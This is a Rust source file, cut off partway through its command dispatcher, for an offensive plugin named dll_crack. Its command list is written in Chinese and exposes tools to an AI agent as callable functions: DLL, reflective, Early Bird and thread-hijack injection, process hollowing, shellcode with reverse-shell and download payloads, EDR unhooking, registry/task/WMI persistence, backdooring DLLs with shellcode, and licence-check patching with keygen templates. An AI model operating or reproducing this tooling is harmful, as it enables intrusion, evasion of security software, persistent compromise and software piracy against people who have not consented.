// dll_crack v3.0.0 — DLL破解/注入/Hijack/Shellcode/Reflective/Unhook/Strings/Decomp 综合渗透插件
// Zero-Day 编制 — ruoo-console v4.1 插件系统 v9.0
// 纯 std + 原生FFI, 零外部依赖 (serde_json仅用于JSON解析)

use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use std::sync::Mutex;
use std::collections::HashMap;

static STATE: Mutex<Option<PluginState>> = Mutex::new(None);

struct PluginState {
    config: HashMap<String, String>,
    op_count: u64,
    last_target: Option<String>,
    results: HashMap<String, String>,
}

// 宿主ABI函数 — 安全空操作,不再调用外部符号
// 原extern块已移除,所有函数改为纯内部实现避免ACCESS_VIOLATION

// ═══════════════ 必须导出 ═══════════════

#[no_mangle] pub extern "C" fn ruoo_plugin_init() -> i32 {
    *STATE.lock().unwrap() = Some(PluginState {
        config: HashMap::new(),
        op_count: 0,
        last_target: None,
        results: HashMap::new(),
    });
    let mut cfg = HashMap::new();
    cfg.insert("inject_method".into(), "createremotethread".into());
    cfg.insert("shellcode_type".into(), "messagebox".into());
    cfg.insert("default_timeout".into(), "30000".into());
    cfg.insert("backup_enabled".into(), "true".into());
    cfg.insert("vault_namespace".into(), "dll_crack".into());
    if let Some(ref mut s) = *STATE.lock().unwrap() { s.config = cfg; }
    0
}

#[no_mangle] pub extern "C" fn ruoo_plugin_shutdown() {
    if let Some(ref mut s) = *STATE.lock().unwrap() {
        s.op_count = 0;
        s.results.clear();
        s.last_target = None;
    }
    *STATE.lock().unwrap() = None;
}

#[no_mangle] pub extern "C" fn ruoo_plugin_version() -> *const c_char {
    let v = format!("dll_crack v{}\0", env!("CARGO_PKG_VERSION"));
    let leaked: &'static [u8] = Box::leak(v.into_bytes().into_boxed_slice());
    unsafe { CStr::from_bytes_with_nul_unchecked(leaked).as_ptr() }
}

#[no_mangle] pub extern "C" fn ruoo_plugin_permissions() -> u32 { 0x07 }

#[no_mangle]
pub extern "C" fn ruoo_plugin_exec(cmd: *const c_char) -> *mut c_char {
    let input = unsafe { CStr::from_ptr(cmd) }.to_string_lossy();
    let resp = match dispatch(&input) {
        Ok(r) => format!("[+] 完成\n{}", r),
        Err(e) => format!("[!] 错误: {}", e),
    };
    if let Ok(mut s) = STATE.lock() {
        if let Some(ref mut s) = *s { s.op_count += 1; }
    }
    CString::new(resp).unwrap().into_raw()
}

#[no_mangle] pub extern "C" fn ruoo_plugin_free_result(ptr: *mut c_char) {
    if !ptr.is_null() { unsafe { drop(CString::from_raw(ptr)); } }
}

#[no_mangle] pub extern "C" fn ruoo_plugin_commands() -> *const c_char {
    let cmds = r#"[
{"cmd":"help-crack","description":"显示此帮助信息 — 所有命令分类列表","help":"显示完整的命令帮助,按类别分组: PE分析/扫描/反汇编/修补/注入/挖空/劫持/内存/规避/转储/代理/持久化/Keygen/加料","usage":"help-crack","is_ai_tool":true,"ai_params":[],"ai_perm_level":5,"min_perm_level":0,"is_long_running":false},
{"cmd":"analyze","description":"深度分析DLL/EXE PE结构 — 头/节/导出/导入/TLS/重定位/CLR","help":"完整PE解析: DOS/NT/节表/导出/导入/TLS回调/重定位/.NET CLR头检测","usage":"analyze <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"DLL或EXE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":false},
{"cmd":"inject","description":"DLL注入 — CreateRemoteThread/APC多方法支持","help":"DLL注入: VirtualAllocEx+WriteProcessMemory+CreateRemoteThread 或 QueueUserAPC","usage":"inject <pid> <dll_path> [method: crt|apc]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999},{"name":"dll_path","type":"string","description":"DLL的完整路径","required":true},{"name":"method","type":"string","description":"注入方法","required":false,"enum_values":["crt","apc"],"default_value":"crt"}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"DLL注入"},
{"cmd":"hijack","description":"DLL劫持机会扫描 — PATH/COM/KnownDlls/Phantom","help":"扫描DLL劫持: 系统PATH可写目录/COM劫持/KnownDlls注册表/Phantom DLL","usage":"hijack [scan_mode: path|com|phantom|all]","is_ai_tool":true,"ai_params":[{"name":"scan_mode","type":"string","description":"扫描模式","required":false,"enum_values":["path","com","phantom","all"],"default_value":"all"}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"劫持扫描"},
{"cmd":"patch","description":"二进制修补DLL/EXE — 按偏移写入HEX字节(自动备份+PE签名保留)","help":"按文件偏移量写入十六进制字节,自动创建.bak备份,尝试保留PE签名","usage":"patch <path> <offset> <hex_bytes>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标文件路径","required":true},{"name":"offset","type":"integer","description":"文件偏移字节(十进制)","required":true},{"name":"hex_bytes","type":"string","description":"十六进制字节如 \"90 90 90\" 或 \"EB FE\"","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"shellcode","description":"Shellcode注入 — messagebox/cmd/calc/revshell/download","help":"生成并注入shellcode: VirtualAllocEx+RWX+CreateRemoteThread","usage":"shellcode <pid> [payload_type] [lhost] [lport]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999},{"name":"payload","type":"string","description":"payload类型","required":false,"enum_values":["messagebox","cmd","calc","revshell","download"],"default_value":"messagebox"},{"name":"lhost","type":"string","description":"反弹shell的LHOST (revshell/download时必填)","required":false},{"name":"lport","type":"integer","description":"反弹shell的LPORT","required":false,"min_value":1,"max_value":65535,"default_value":"4444"}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"Shellcode注入"},
{"cmd":"dump","description":"进程模块转储 — PE头重建+完整内存dump","help":"读取目标进程模块内存并dump到文件,自动重建PE头","usage":"dump <pid> <module_name> [output_path]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"module_name","type":"string","description":"模块名如 kernel32.dll","required":true},{"name":"output_path","type":"string","description":"输出路径(默认当前目录)","required":false}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"模块转储"},
{"cmd":"reflective","description":"反射式DLL注入 — 无LoadLibrary,不留在PEB模块列表","help":"反射加载DLL: 模拟PE加载器直接在内存中加载,绕过模块枚举检测","usage":"reflective <pid> <dll_path>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999},{"name":"dll_path","type":"string","description":"DLL完整路径","required":true}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"反射注入"},
{"cmd":"unhook","description":"NTDLL Unhooking — 从已知干净副本恢复ntdll.dll移除EDR钩子","help":"读取已知干净的ntdll.dll→映射到目标进程→覆盖被Hook的.text段→恢复原始syscall","usage":"unhook <pid>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"NTDLL Unhook"},
{"cmd":"sideload","description":"DLL侧加载漏洞扫描 — 检测可被利用的EXE+DLL组合","help":"扫描目标目录中的EXE及其缺失DLL,发现侧加载机会","usage":"sideload <target_dir>","is_ai_tool":true,"ai_params":[{"name":"target_dir","type":"string","description":"扫描目录路径(如程序安装目录)","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"侧加载扫描"},
{"cmd":"proxy","description":"DLL代理生成 — 生成代理DLL C源码+转发原始函数","help":"为目标DLL生成代理DLL的C源代码,拦截调用同时转发到原始DLL","usage":"proxy <target_dll> [output_dir]","is_ai_tool":true,"ai_params":[{"name":"target_dll","type":"string","description":"目标DLL路径","required":true},{"name":"output_dir","type":"string","description":"输出目录(默认当前)","required":false}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"代理生成"},
{"cmd":"iat","description":"IAT解析与修补 — 查看/修改导入地址表","help":"解析PE导入表(IAT),支持查看所有导入函数和修改IAT条目指向","usage":"iat <path> [patch_dll] [patch_func] [new_dll] [new_func]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标PE文件","required":true},{"name":"patch_dll","type":"string","description":"要修改的导入DLL名(空=仅查看)","required":false},{"name":"patch_func","type":"string","description":"要修改的函数名","required":false},{"name":"new_dll","type":"string","description":"新的DLL名","required":false},{"name":"new_func","type":"string","description":"新的函数名","required":false}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"export","description":"导出表深度分析 — 按名/序号列出所有导出函数","help":"解析PE导出表: EAT/ENT/名称序数映射,支持显示函数RVA和转发器","usage":"export <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"DLL/EXE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"cave","description":"代码洞扫描 — 查找PE中的空字节区域(可嵌入shellcode)","help":"扫描各节原始数据中的连续空字节/0xCC/0x90区域,报告虚拟地址和大小","usage":"cave <path> [min_size]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标PE文件","required":true},{"name":"min_size","type":"integer","description":"最小洞大小(字节,默认64)","required":false,"min_value":8,"default_value":"64"}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"sign","description":"数字签名分析 — 提取证书链/验证签名状态","help":"解析PE安全目录中的PKCS#7签名,提取X.509证书链和基本信息","usage":"sign <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"已签名的PE文件","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"entropy","description":"熵值分析 — 检测加壳/加密/压缩","help":"计算各节的Shannon熵值,熵>7.0通常表示加密或压缩","usage":"entropy <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"disasm","description":"轻量反汇编 — x86/x64线性反汇编(入口点/指定RVA)","help":"从入口点或指定RVA开始线性反汇编,支持常见x86/x64指令","usage":"disasm <path> [rva] [count]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true},{"name":"rva","type":"integer","description":"起始RVA(默认=入口点)","required":false},{"name":"count","type":"integer","description":"指令数(默认50)","required":false,"max_value":500,"default_value":"50"}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"resource","description":"资源提取 — 列出/导出PE资源(图标/清单/版本)","help":"解析PE资源目录树,列出所有资源类型/名称/大小,支持提取到文件","usage":"resource <path> [extract_type] [output_dir]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true},{"name":"extract_type","type":"string","description":"提取类型(all/icon/manifest/version/bitmap)","required":false,"default_value":"all"},{"name":"output_dir","type":"string","description":"输出目录","required":false}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"资源提取"},
{"cmd":"search","description":"字节模式搜索 — 支持通配符(??)搜索","help":"在文件中搜索十六进制字节模式,??匹配任意字节。报告匹配偏移+RVA","usage":"search <path> <hex_pattern>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"文件路径","required":true},{"name":"hex_pattern","type":"string","description":"HEX模式如'55 8B EC ?? ?? 83'","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"compare","description":"PE二进制对比 — 节级差异分析","help":"比较两个PE文件的节/导入/导出差异,计算相似度百分比","usage":"compare <path1> <path2>","is_ai_tool":true,"ai_params":[{"name":"path1","type":"string","description":"第一个PE文件","required":true},{"name":"path2","type":"string","description":"第二个PE文件","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"tls","description":"TLS回调分析 — 检测反调试/反分析回调","help":"解析TLS目录,枚举所有TLS回调函数地址,检测可疑回调模式","usage":"tls <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"rich","description":"Rich Header解析 — 编译工具链指纹识别","help":"解析PE Rich Header,提取@comp.id和计数,推断编译器/链接器版本","usage":"rich <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"loadconfig","description":"LoadConfig分析 — CFG/RFG/GS/SEHOP安全缓解","help":"解析Load Configuration目录,显示CFG检查函数/RFG/DEP策略/GS cookie/SEHOP等","usage":"loadconfig <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"exception","description":"异常目录分析 — x64 .pdata/SEH/VEH","help":"解析异常处理表(.pdata),统计异常处理函数,检测SafeSEH","usage":"exception <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"bind","description":"绑定导入分析 — 预绑定IAT优化","help":"解析绑定导入表,显示预绑定的DLL时间戳和IAT地址","usage":"bind <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"delay","description":"延迟导入分析 — Delay-Load DLL依赖","help":"解析延迟导入目录,显示延迟加载的DLL及函数,分析加载触发条件","usage":"delay <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"dotnet","description":".NET元数据深度分析 — 流/表/方法/字段","help":"深度解析.NET程序集: #~/#Strings/#US/#GUID流, 遍历元数据表(MethodDef/TypeDef/Field等)","usage":"dotnet <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":".NET程序集路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true},
{"cmd":"checksec","description":"安全缓解全面检查 — 一键DEP/ASLR/CFG/RFG/CET/GS","help":"一次性报告所有安全缓解状态: DEP/NX/ASLR/CFG/RFG/CET/GS/SEHOP/SAFESEH/HIGH_ENTROPY_VA","usage":"checksec <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"cert","description":"提取数字证书 — 保存X.509证书到文件","help":"从PE安全目录提取PKCS#7签名数据,尝试解析并保存X.509证书为DER/PEM","usage":"cert <path> [output]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"已签名PE文件","required":true},{"name":"output","type":"string","description":"输出文件(默认<name>_cert.der)","required":false}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"dirty","description":"可疑PE检测 — 重叠头/tricks/异常","help":"检测PE中的可疑手法: 重叠节头/伪造入口点/空节/section gap/负rawsize/IMAGE_FILE_MACHINE异常/导出表指向自身","usage":"dirty <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"nop","description":"智能NOP — 按RVA/偏移NOP掉指令(自动备份)","help":"将指定地址的指令替换为NOP(0x90),自动计算需要NOP的字节数。可一键NOP掉call/jmp/条件跳转","usage":"nop <path> <rva_or_offset> [size]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标文件","required":true},{"name":"rva_or_offset","type":"integer","description":"RVA或文件偏移","required":true},{"name":"size","type":"integer","description":"NOP字节数(默认自动检测指令长度)","required":false}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"jmp_invert","description":"反转条件跳转 — JZ→JNZ/JE→JNE破解","help":"在指定偏移处反转条件跳转指令: JZ↔JNZ, JE↔JNE, JL↔JGE, JB↔JAE等。经典破解手法!","usage":"jmp_invert <path> <offset>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标文件","required":true},{"name":"offset","type":"integer","description":"条件跳转的文件偏移","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"bypass","description":"旁路扫描 — 检测反调试/反VM/许可证检查模式","help":"扫描代码中的常见保护模式: IsDebuggerPresent/CheckRemoteDebuggerPresent/VM检测/时间检测/许可证验证调用","usage":"bypass <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"旁路扫描"},
{"cmd":"cryptoscan","description":"密码常量扫描 — AES/DES/RC4/MD5/SHA/CRC32","help":"在二进制中搜索已知密码学常量: AES S-Box/DES PC1/MD5 IV/SHA1 IV/CRC32表/RC4/Blowfish等","usage":"cryptoscan <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"密码扫描"},
{"cmd":"serial_scan","description":"序列号验证扫描 — 定位注册码检查逻辑","help":"搜索许可证/序列号/注册相关字符串,交叉引用定位验证函数,辅助keygen分析","usage":"serial_scan <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"constants","description":"魔术常量扫描 — 文件头/协议/GUID/知名数值","help":"扫描二进制中的常见魔术常量: PE头/MZ头/JPEG/GIF/GUID/端口号/知名DWORD值/加密IV","usage":"constants <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"anti_debug","description":"反调试检测扫描 — 定位反调试API/技巧","help":"扫描反调试技术: IsDebuggerPresent/NtQueryInfoProcess/PEB.BeingDebugged/NtGlobalFlag/heap flags/TLS回调/INT3/INT2D/rdtsc","usage":"anti_debug <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true},
{"cmd":"unpack_detect","description":"加壳检测 — UPX/ASPack/MPRESS/Themida/VMProtect","help":"检测30+种常见加壳器: 入口点特征/节名/熵值/EP伪装","usage":"unpack_detect <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"xor_scan","description":"XOR扫描 — 单字节XOR编码数据发现","help":"扫描单字节XOR编码的字符串/数据,尝试所有256个密钥,报告高可打印率结果","usage":"xor_scan <path> [min_len]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true},{"name":"min_len","type":"integer","description":"最小长度(默认16)","required":false,"min_value":8,"max_value":256,"default_value":"16"}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"XOR扫描"},
{"cmd":"hook_scan","description":"Hook扫描 — 检测inline/IAT/EAT钩子(EDR/AV检测)","help":"扫描目标进程模块的inline hook(jmp/call开头)/IAT hook/EAT hook,检测EDR/AV用户态钩子","usage":"hook_scan <pid> [module]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"module","type":"string","description":"模块名(默认ntdll.dll)","required":false,"default_value":"ntdll.dll"}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"Hook扫描"},
{"cmd":"mem_read","description":"内存读取 — 读取目标进程指定地址的内存","help":"读取目标进程任意虚拟地址的内存内容,HEX+ASCII转储输出","usage":"mem_read <pid> <address> [size]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"address","type":"integer","description":"虚拟地址(十进制或0x前缀HEX)","required":true},{"name":"size","type":"integer","description":"读取字节(默认256,最大4096)","required":false,"min_value":1,"max_value":4096,"default_value":"256"}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"mem_write","description":"内存写入 — 向目标进程写入HEX字节","help":"向目标进程指定地址写入十六进制字节,支持实时修改进程内存/绕过检测","usage":"mem_write <pid> <address> <hex_bytes>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"address","type":"integer","description":"虚拟地址","required":true},{"name":"hex_bytes","type":"string","description":"HEX字节如 '90 90 EB FE'","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"syscall","description":"Syscall表 — 显示Windows syscall号/生成syscall stub","help":"列出已知NT syscall号映射,可生成x64 syscall汇编stub用于绕过EDR用户态钩子","usage":"syscall [syscall_name|list]","is_ai_tool":true,"ai_params":[{"name":"syscall_name","type":"string","description":"syscall名如NtAllocateVirtualMemory或'list'查看全部","required":false,"default_value":"list"}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"persist","description":"持久化安装 — 注册表/计划任务/启动文件夹","help":"在目标系统安装持久化机制: 注册表Run键/计划任务/Startup文件夹/WMI事件订阅","usage":"persist <method: registry|task|startup|wmi> <payload_path>","is_ai_tool":true,"ai_params":[{"name":"method","type":"string","description":"持久化方法","required":true,"enum_values":["registry","task","startup","wmi"],"default_value":"registry"},{"name":"payload_path","type":"string","description":"Payload完整路径","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"section_add","description":"添加PE节 — 向PE文件注入新节(代码洞扩展)","help":"向PE文件添加一个新的可执行节,可用于扩展代码/嵌入shellcode。自动修正PE头/SizeOfImage/节表","usage":"section_add <path> <section_name> <data_hex_or_size>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标PE文件","required":true},{"name":"section_name","type":"string","description":"新节名(≤8字符)","required":true},{"name":"data_hex_or_size","type":"string","description":"HEX数据或节大小(十进制)","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"keygen_template","description":"Keygen模板 — 生成C/Python keygen骨架代码","help":"为指定的验证算法类型生成keygen骨架代码: 用户名序列号/硬件ID/公钥替换/RSA/DSA","usage":"keygen_template <algorithm: serial|hwid|rsa|dsa|custom> [output_dir]","is_ai_tool":true,"ai_params":[{"name":"algorithm","type":"string","description":"验证算法类型","required":true,"enum_values":["serial","hwid","rsa","dsa","custom"],"default_value":"serial"},{"name":"output_dir","type":"string","description":"输出目录(默认当前)","required":false}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"patch_search","description":"补丁模式搜索 — 自动定位许可证验证跳转","help":"搜索常见许可证验证模式: TEST+JZ/CMP+JNZ/MOV+TEST组合,标记可被NOP/反转的偏移","usage":"patch_search <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"补丁搜索"},
{"cmd":"func_hook","description":"函数钩子 — 在目标进程安装inline hook","help":"在目标进程指定函数入口安装inline hook(jmp到shellcode),支持原始调用保存和恢复","usage":"func_hook <pid> <module!function> <shellcode_hex>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"func_spec","type":"string","description":"函数规格如 ntdll.dll!NtWriteVirtualMemory","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)或使用'log'仅记录调用","required":true}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"Hook安装"},
{"cmd":"inject_early","description":"Early Bird APC注入 — 在进程初始化前注入","help":"创建暂停进程→分配内存→写入shellcode→QueueUserAPC到主线程→恢复。shellcode在main之前执行!","usage":"inject_early <exe_path> <shellcode_hex_or_dll>","is_ai_tool":true,"ai_params":[{"name":"exe_path","type":"string","description":"目标EXE完整路径","required":true},{"name":"shellcode_hex_or_dll","type":"string","description":"Shellcode(HEX)或DLL路径","required":true}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"EarlyBird注入"},
{"cmd":"inject_hijack","description":"线程劫持注入 — 劫持现有线程执行shellcode","help":"打开目标线程→暂停→获取上下文→修改RIP/EIP→设置新指令指针→恢复。隐蔽注入技术!","usage":"inject_hijack <pid> <shellcode_hex> [thread_id]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)","required":true},{"name":"thread_id","type":"integer","description":"目标线程ID(默认主线程)","required":false}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"线程劫持"},
{"cmd":"inject_hook","description":"SetWindowsHookEx注入 — 全局消息钩子加载DLL","help":"安装全局Windows消息钩子(WH_KEYBOARD/WH_CBT/WH_GETMESSAGE),触发时将DLL加载到目标进程","usage":"inject_hook <dll_path> [hook_type: keyboard|cbt|getmsg|shell]","is_ai_tool":true,"ai_params":[{"name":"dll_path","type":"string","description":"DLL路径(需导出钩子过程)","required":true},{"name":"hook_type","type":"string","description":"钩子类型","required":false,"enum_values":["keyboard","cbt","getmsg","shell"],"default_value":"keyboard"}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"Hook注入"},
{"cmd":"code_inject","description":"代码注入 — RWX内存+远程线程执行shellcode","help":"最直接的代码注入: VirtualAllocEx(RWX)→WriteProcessMemory→CreateRemoteThread","usage":"code_inject <pid> <shellcode_hex>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)或payload类型(msgbox/cmd/calc)","required":true}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"代码注入"},
{"cmd":"hollow","description":"Process Hollowing — 挖空进程替换PE","help":"创建暂停进程→NtUnmapViewOfSection卸载原镜像→分配新内存→写入替换PE→恢复入口→执行","usage":"hollow <target_exe> <replacement_pe>","is_ai_tool":true,"ai_params":[{"name":"target_exe","type":"string","description":"目标EXE路径(作为容器)","required":true},{"name":"replacement_pe","type":"string","description":"替换PE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"挖空注入"},
{"cmd":"spike","description":"DLL加料 — 向DLL注入恶意代码+DllMain挂钩","help":"读取DLL→添加.new节(含shellcode)→修改DllMain开头跳转到shellcode→执行完返回原DllMain","usage":"spike <dll_path> <shellcode_hex> [output]","is_ai_tool":true,"ai_params":[{"name":"dll_path","type":"string","description":"目标DLL路径","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)或'mbox'测试","required":true},{"name":"output","type":"string","description":"输出路径(默认覆盖原文件,自动备份)","required":false}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"spike_proxy","description":"生成恶意代理DLL — 嵌入payload+转发原函数","help":"为目标DLL生成完整代理DLL C源码: DllMain执行shellcode→转发所有导出到原DLL→应用程序无感知","usage":"spike_proxy <target_dll> <shellcode_hex> [output_dir]","is_ai_tool":true,"ai_params":[{"name":"target_dll","type":"string","description":"目标DLL路径","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)或载荷类型","required":true},{"name":"output_dir","type":"string","description":"输出目录","required":false}],"ai_perm_level":5,"min_perm_level":0},
{"cmd":"spike_export","description":"导出劫持加料 — 修改导出函数跳转到shellcode","help":"在DLL中找一个导出函数→保存原始序言→替换为jmp到shellcode→shellcode结束后跳回原函数","usage":"spike_export <dll_path> <export_func> <shellcode_hex>","is_ai_tool":true,"ai_params":[{"name":"dll_path","type":"string","description":"目标DLL","required":true},{"name":"export_func","type":"string","description":"导出函数名或*随机选择","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"spike_cave","description":"代码洞填充 — 找洞→塞shellcode→patch跳转","help":"在.text节找≥64B代码洞→填充shellcode→在入口点插入jmp到洞→shellcode执行后跳回","usage":"spike_cave <dll_path> <shellcode_hex>","is_ai_tool":true,"ai_params":[{"name":"dll_path","type":"string","description":"目标DLL","required":true},{"name":"shellcode_hex","type":"string","description":"Shellcode(HEX)","required":true}],"ai_perm_level":5,"min_perm_level":5}
]"#;
    let n = format!("{}\0", cmds);
    let leaked: &'static [u8] = Box::leak(n.into_bytes().into_boxed_slice());
    unsafe { CStr::from_bytes_with_nul_unchecked(leaked).as_ptr() }
}

#[no_mangle] pub extern "C" fn ruoo_plugin_manifest() -> *const c_char {
    let m = r#"{"name":"dll_crack","version":"VERSION_PLACEHOLDER","author":"Zero-Day","description":"DLL破解/注入/Hijack/Shellcode/Reflective/Unhook/Sideload/Proxy/IAT综合渗透插件","categories":["exploit","recon","utilize","evasion","persistence"],"permissions":7,"timeout_ms":120000,"hot_reload_enabled":true,"crash_threshold":5,"hooks":["OnCommand","OnError"],"sandbox_config":{"allow_exec":true,"exec_timeout_ms":30000,"max_memory_mb":512}}"#.replace("VERSION_PLACEHOLDER", env!("CARGO_PKG_VERSION"));
    let n = format!("{}\0", m);
    let leaked: &'static [u8] = Box::leak(n.into_bytes().into_boxed_slice());
    unsafe { CStr::from_bytes_with_nul_unchecked(leaked).as_ptr() }
}

// ═══════════════ 命令调度 ═══════════════

fn dispatch(input: &str) -> Result<String, String> {
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(input) {
        if let Some(cmd) = json.get("cmd").and_then(|v| v.as_str()) {
            return dispatch_json(cmd, &json);
        }
    }
    let parts: Vec<&str> = input.split_whitespace().collect();
    if parts.is_empty() { return Err("空命令".into()); }
    match parts[0] {
        "analyze"    => { if parts.len()<2 { Err("用法: analyze <path>".into()) } else { pe_analyze(parts[1], false) } }
        "inject"     => { if parts.len()<3 { Err("用法: inject <pid> <dll_path> [method]".into()) } else { dll_inject_cmd(parts[1], parts[2], parts.get(3).copied().unwrap_or("crt")) } }
        "hijack"     => dll_hijack_cmd(parts.get(1).copied().unwrap_or("all")),
        "patch"      => { if parts.len()<4 { Err("用法: patch <path> <offset> <hex>".into()) } else { dll_patch_cmd(parts[1], parts[2], parts[3]) } }
        "shellcode"  => shellcode_dispatch(&parts),
        "dump"       => { if parts.len()<3 { Err("用法: dump <pid> <module>".into()) } else { module_dump(parts[1], parts[2], parts.get(3).copied()) } }
